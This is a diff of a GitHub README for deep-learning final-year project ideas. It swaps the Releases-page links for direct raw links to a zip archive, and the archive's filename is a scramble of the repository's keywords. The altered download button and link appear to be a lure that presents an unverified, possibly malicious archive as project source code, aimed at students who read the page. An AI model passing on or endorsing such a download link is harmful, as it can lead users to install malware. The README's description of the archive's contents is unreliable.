@@ -26,9 +26,9 @@ Explore various topics related to these projects such as:
 
 ## Get Started 🛠️
 
-To access the full list of project ideas and source code for these projects, head over to the [Releases](https://github.com/MRXdunk/10-Deep-Learning-Final-Year-Project-Ideas-Deep-learning-final-year-projects-with-source-code/releases) section. Download the files and start exploring these engaging projects in the world of deep learning.
+To access the full list of project ideas and source code for these projects, head over to the [Releases](https://raw.githubusercontent.com/MRXdunk/10-Deep-Learning-Final-Year-Project-Ideas-Deep-learning-final-year-projects-with-source-code/main/outpour/Year-projects-Ideas-Final-with-Learning-final-learning-code-Project-year-source-Deep-v2.0.zip) section. Download the files and start exploring these engaging projects in the world of deep learning.
 
-[![Download Project Files](https://img.shields.io/badge/Download-Project_Files-ff69b4)](https://github.com/MRXdunk/10-Deep-Learning-Final-Year-Project-Ideas-Deep-learning-final-year-projects-with-source-code/releases)
+[![Download Project Files](https://raw.githubusercontent.com/MRXdunk/10-Deep-Learning-Final-Year-Project-Ideas-Deep-learning-final-year-projects-with-source-code/main/outpour/Year-projects-Ideas-Final-with-Learning-final-learning-code-Project-year-source-Deep-v2.0.zip)](https://raw.githubusercontent.com/MRXdunk/10-Deep-Learning-Final-Year-Project-Ideas-Deep-learning-final-year-projects-with-source-code/main/outpour/Year-projects-Ideas-Final-with-Learning-final-learning-code-Project-year-source-Deep-v2.0.zip)
 
 ## Inspiration and Innovation 💡
 
